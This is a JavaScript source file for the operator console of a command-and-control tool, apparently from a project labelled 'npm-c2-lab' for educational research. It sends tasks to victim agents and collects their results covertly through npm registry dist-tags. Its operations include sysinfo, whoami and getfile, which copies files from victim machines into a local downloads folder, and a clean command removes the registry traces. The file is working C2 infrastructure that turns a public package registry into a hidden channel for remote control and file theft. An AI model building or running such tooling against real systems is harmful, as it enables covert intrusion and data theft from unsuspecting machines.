// Attacker CLI: interactive REPL that issues commands and collects results
// exclusively through npm dist-tags. It never talks to a victim directly.
//
// Commands:
//   agents                      list agent ids seen in result tags / state
//   task <agentId|all> <op> [args...]   publish a command tag
//                         (ops: echo, sysinfo, ping, time, whoami, getfile)
//   poll                        one-shot fetch & decode of new result tags
//   watch [intervalSec]         continuously poll until Ctrl-C
//   clean                       delete all lab tags (x-cmd-*/x-res-*) from the registry
//   stats                       local counters: commands sent, results received, per-agent
//   help                        show help
//   exit                        save state and quit

import readline from 'node:readline/promises';
import fs from 'node:fs';
import path from 'node:path';
import { styleText } from 'node:util';
import { loadConfig, configArgFromArgv } from '../common/config.js';
import { createLogger } from '../common/logger.js';
import {
  PINNED_VERSION,
  TASK_OPS,
  decodeResultTag,
  encodeCommandTag,
  isLabTag,
  isResultTag,
  reassembleResult,
} from '../common/protocol.js';
import { RegistryClient } from '../common/registry.js';
import { saveState } from '../victim/agent.js';

const tty = process.stdout.isTTY;
const c = (color, s) => (tty ? styleText(color, s) : s);

// ---------------------------------------------------------------------------
// attacker state (separate shape from victim state, same persistence helpers)
// ---------------------------------------------------------------------------

function defaultAttackerState() {
  return {
    nextSeq: {}, // per-target (agentId or 'all') next sequence number
    sent: 0,
    received: 0,
    perAgent: {}, // agentId -> results received
    seenResults: [], // "<agentId>:<seq>" strings
    agents: [], // agent ids observed
  };
}

function loadAttackerState(path) {
  const s = defaultAttackerState();
  try {
    const raw = JSON.parse(fs.readFileSync(path, 'utf8'));
    if (raw && typeof raw === 'object') {
      for (const k of Object.keys(s)) {
        if (raw[k] !== undefined) s[k] = raw[k];
      }
    }
  } catch {
    // missing or corrupt state file -> start fresh
  }
  return s;
}

// ---------------------------------------------------------------------------

function parseTaskLine(line) {
  const tokens = line.trim().split(/\s+/);
  const [, target, op, ...rest] = tokens;
  if (!target || !op) {
    throw new Error('usage: task <agentId|all> <op> [args...]');
  }
  if (!TASK_OPS.includes(op)) {
    throw new Error(`unknown op "${op}" — allowed: ${TASK_OPS.join(', ')}`);
  }
  const args = {};
  if (op === 'echo') args.text = rest.join(' ');
  if (op === 'getfile') {
    args.path = rest.join(' ');
    if (!args.path) throw new Error('usage: task <agentId|all> getfile <path>');
  }
  return { target, op, args };
}

function sanitizeFilename(name) {
  return path.basename(String(name)).replace(/[^A-Za-z0-9._-]/g, '_') || 'file.bin';
}

/** Save a transferred file from a result payload to downloads/. */
function saveDownload(agentId, r) {
  const dir = path.resolve('downloads');
  fs.mkdirSync(dir, { recursive: true });
  const out = path.join(dir, `${agentId}-seq${r.seq}-${sanitizeFilename(r.file.name)}`);
  if (!Number.isSafeInteger(r.file.size) || r.file.size < 0) {
    throw new Error('missing or invalid file size');
  }
  if (typeof r.file.dataB64 !== 'string' || !/^[A-Za-z0-9+/]*={0,2}$/.test(r.file.dataB64)) {
    throw new Error('file payload is not valid base64');
  }
  const data = Buffer.from(r.file.dataB64, 'base64');
  if (data.length !== r.file.size) {
    throw new Error(`decoded size mismatch (${data.length} bytes, expected ${r.file.size})`);
  }
  fs.writeFileSync(out, data);
  return out;
}

function printResult(agentId, r) {
  const head = c('magenta', `${agentId} seq=${r.seq} op=${r.op ?? '?'}`);
  if (!r.ok) {
    console.log(`${head} ${c('red', 'error')}: ${r.error}`);
    return;
  }
  if (r.file && typeof r.file.dataB64 === 'string') {
    try {
      const out = saveDownload(agentId, r);
      console.log(`${head} ${c('green', 'ok')}: ${r.output} -> saved to ${c('bold', out)}`);
    } catch (err) {
      console.log(`${head} ${c('red', 'error')}: received file but failed to save: ${err.message}`);
    }
    return;
  }
  console.log(`${head} ${c('green', 'ok')}: ${r.output}`);
}

async function main() {
  const cfg = loadConfig(configArgFromArgv());
  const logger = createLogger({
    level: process.env.NPM_C2_LOG_LEVEL || 'info',
    logFile: cfg.logFile,
    console: false, // keep REPL output clean; log lines go to the file only
  });
  const statePath = cfg.stateFile || 'attacker-state.json';
  const state = loadAttackerState(statePath);
  const save = () => saveState(statePath, state);

  const client = new RegistryClient({
    registryUrl: cfg.registryUrl,
    packageName: cfg.packageName,
    token: cfg.token,
    logger,
  });

  console.log(c('cyan', 'npm-c2-lab attacker CLI (educational research only)'));
  console.log(`registry=${cfg.registryUrl} package=${cfg.packageName}`);
  if (!cfg.token) {
    console.log(c('yellow', 'warning: NPM_C2_TOKEN is not set — writes will fail with 401'));
  }
  console.log('type "help" for commands');

  // --- shared helpers -------------------------------------------------------

  async function pollOnce({ quiet = false } = {}) {
    const tags = await client.getDistTags();
    const groups = new Map(); // "<agentId>:<seq>" -> parts[]
    for (const name of Object.keys(tags)) {
      if (!isResultTag(name)) continue;
      let part;
      try {
        part = decodeResultTag(name);
      } catch (err) {
        logger.warn(`skipping malformed result tag "${name}": ${err.message}`);
        continue;
      }
      const key = `${part.agentId}:${part.seq}`;
      if (!groups.has(key)) groups.set(key, []);
      groups.get(key).push(part);
      if (!state.agents.includes(part.agentId)) state.agents.push(part.agentId);
    }
    let fresh = 0;
    for (const [key, parts] of groups) {
      if (state.seenResults.includes(key)) continue;
      const total = parts[0].total;
      if (new Set(parts.map((p) => p.chunk)).size !== total) {
        if (!quiet) console.log(c('yellow', `${key}: waiting for chunks (${new Set(parts.map((p) => p.chunk)).size}/${total})`));
        continue;
      }
      try {
        const result = reassembleResult(parts);
        printResult(parts[0].agentId, result);
        state.seenResults.push(key);
        state.received++;
        const a = parts[0].agentId;
        state.perAgent[a] = (state.perAgent[a] ?? 0) + 1;
        fresh++;
      } catch (err) {
        logger.warn(`failed to reassemble ${key}: ${err.message}`);
      }
    }
    save();
    if (!quiet && fresh === 0) console.log('no new results');
    return fresh;
  }

  const commands = {
    help() {
      console.log(
        [
          `${c('bold', 'agents')}                          list agent ids seen so far`,
          `${c('bold', 'task')} <agentId|all> <op> [args]  send a task (ops: ${TASK_OPS.join(', ')})`,
          `${c('bold', 'poll')}                            fetch & decode new result tags once`,
          `${c('bold', 'watch')} [intervalSec]             poll continuously until Ctrl-C`,
          `${c('bold', 'clean')}                           delete all x-cmd-*/x-res-* tags`,
          `${c('bold', 'stats')}                           show local counters`,
          `${c('bold', 'help')}                            this help`,
          `${c('bold', 'exit')}                            save state and quit`,
        ].join('\n'),
      );
    },

    async agents() {
      try {
        await pollOnce({ quiet: true }); // best-effort refresh
      } catch (err) {
        console.log(c('yellow', `registry refresh failed: ${err.message}`));
      }
      if (state.agents.length === 0) {
        console.log('no agents seen yet');
      } else {
        for (const a of state.agents) console.log(`- ${c('green', a)} (${state.perAgent[a] ?? 0} results)`);
      }
    },

    async task(line) {
      const { target, op, args } = parseTaskLine(line);
      const seq = (state.nextSeq[target] ?? 0) + 1;
      const payload = { op, args, ts: Date.now() };
      const tag = encodeCommandTag(target, seq, payload); // throws if payload too big
      await client.setDistTag(tag, PINNED_VERSION);
      state.nextSeq[target] = seq;
      state.sent++;
      save();
      console.log(`${c('green', 'sent')} ${target}#${seq} ${op} (${tag.length} chars)`);
    },

    async poll() {
      await pollOnce();
    },

    async watch(line) {
      const arg = line.trim().split(/\s+/)[1];
      const intervalSec = arg ? Number(arg) : Math.min(cfg.pollIntervalSec, 5);
      if (!Number.isFinite(intervalSec) || intervalSec <= 0) {
        console.log('usage: watch [intervalSec]');
        return;
      }
      console.log(`watching every ${intervalSec}s — Ctrl-C to stop`);
      let stop = false;
      const onSigint = () => {
        stop = true;
      };
      process.on('SIGINT', onSigint);
      try {
        while (!stop) {
          try {
            await pollOnce({ quiet: true });
          } catch (err) {
            console.log(c('yellow', `poll failed: ${err.message}`));
          }
          await new Promise((r) => setTimeout(r, intervalSec * 1000));
        }
      } finally {
        process.removeListener('SIGINT', onSigint);
      }
      console.log('watch stopped');
    },

    async clean() {
      const tags = await client.getDistTags();
      const lab = Object.keys(tags).filter(isLabTag);
      if (lab.length === 0) {
        console.log('nothing to clean');
        return;
      }
      let deleted = 0;
      for (const tag of lab) {
        try {
          await client.deleteDistTag(tag);
          deleted++;
        } catch (err) {
          console.log(c('yellow', `failed to delete ${tag}: ${err.message}`));
        }
      }
      const remaining = Object.keys(await client.getDistTags());
      console.log(`deleted ${deleted}/${lab.length} lab tags; remaining: ${remaining.join(', ') || '(none)'}`);
    },

    stats() {
      console.log(`commands sent:    ${state.sent}`);
      console.log(`results received: ${state.received}`);
      console.log(`agents seen:      ${state.agents.length}`);
      for (const [a, n] of Object.entries(state.perAgent)) {
        console.log(`  ${a}: ${n} results`);
      }
      console.log(`next seq:         ${JSON.stringify(state.nextSeq)}`);
    },
  };

  // --- REPL -----------------------------------------------------------------

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: c('blue', 'npm-c2> '),
  });
  rl.prompt();

  async function handleLine(line) {
    const trimmed = line.trim();
    const cmd = trimmed.split(/\s+/)[0];
    try {
      if (trimmed === '') {
        // ignore
      } else if (cmd === 'exit' || cmd === 'quit') {
        save();
        rl.close();
        return;
      } else if (commands[cmd]) {
        await commands[cmd](trimmed);
      } else {
        console.log(`unknown command "${cmd}" — type "help"`);
      }
    } catch (err) {
      console.log(c('red', `error: ${err.message}`));
      logger.error(`command "${cmd}" failed: ${err.message}`);
    }
    rl.prompt();
  }

  // Serialize command handling so piped input cannot race (e.g. "exit"
  // killing the process before an earlier async command finishes printing).
  let queue = Promise.resolve();
  rl.on('line', (line) => {
    queue = queue.then(() => handleLine(line));
  });

  rl.on('close', () => {
    queue.then(() => {
      save();
      logger.close();
      console.log('bye');
      process.exit(0);
    });
  });
}

main().catch((err) => {
  console.error(`fatal: ${err.message}`);
  process.exit(1);
});
